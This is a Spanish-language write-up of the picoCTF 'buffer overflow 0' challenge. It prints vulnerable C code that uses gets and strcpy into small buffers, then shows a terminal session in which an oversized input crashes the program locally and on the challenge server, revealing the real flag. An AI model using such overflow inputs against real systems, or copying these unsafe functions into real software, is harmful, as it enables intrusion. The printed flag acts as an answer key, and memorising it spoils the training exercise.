# buffer overflow 0

## Objetivo 
Aplasta la pilaComencemos de manera simple, ¿puede desbordar el búfer correcto? El programa está disponible [aquí](https://artifacts.picoctf.net/c/522/vuln) . Puedes ver la fuente [aquí](https://artifacts.picoctf.net/c/522/vuln.c) . Y conéctate con él usando:`nc saturn.picoctf.net 51110`

## Solución
``` shell
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ nano vuln.c 
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ cat vuln.c            
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ ls
vuln  vuln.c
                                                                                                                                                                       
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ chmod +x vuln
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ file vuln    
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=08fef67fdcc0d93019a26a2f8f97279dee848031, for GNU/Linux 3.2.0, not stripped
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ ./vuln 
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ echo 'flag{dummieflag}'                
flag{dummieflag}
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ echo 'flag{dummieflag}' > flag.txt
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ ./vuln                            
Input: gfchfgchvjbk
The program will exit now
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ ./vuln                            
Input: qwertyuioppoiuytrewqwertyuioiuytrewertyuioytrewqwertyuiuytrewertyuiuytrdesxdcfvgbhnjmjhgvfcdxdcfvgbhnjmjhgfcdxsdcfvgbhnjmhgfdcxsdcfvgybhunjigfdrrxesdctfvygbhnuhgfghjkhgzawsexdrctfvgybhunjimkd cfgybhunjimkdrftvgybhunjimctfvgybhunjcftvgybhunijtcfvygbhunijvfygbhunijm
flag{dummieflag}

                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 0]
└─$ nc saturn.picoctf.net 51110       
Input: qwertyuioppoiuytrewqwertyuioiuytrewertyuioytrewqwertyuiuytrewertyuiuytrdesxdcfvgbhnjmjhgvfcdxdcfvgbhnjmjhgfcdxsdcfvgbhnjmhgfdcxsdcfvgybhunjigfdrrxesdctfvygbhnuhgfghjkhgzawsexdrctfvgybhunjimkd cfgybhunjimkdrftvgybhunjimctfvgybhunjcftvgybhunijtcfvygbhunijvfygbhunijm
picoCTF{ov3rflows_ar3nt_that_bad_8ba275ff}
```

## Notas
¿Cómo se puede activar la bandera para imprimir?

Si intenta hacer los cálculos a mano, tal vez intente agregar algunos caracteres más. A veces hay cosas que no te esperas.

Ejecute `man gets`y lea la sección BUGS. ¿Cuántos caracteres puede leer realmente el programa?

## Referencias
sin referencias.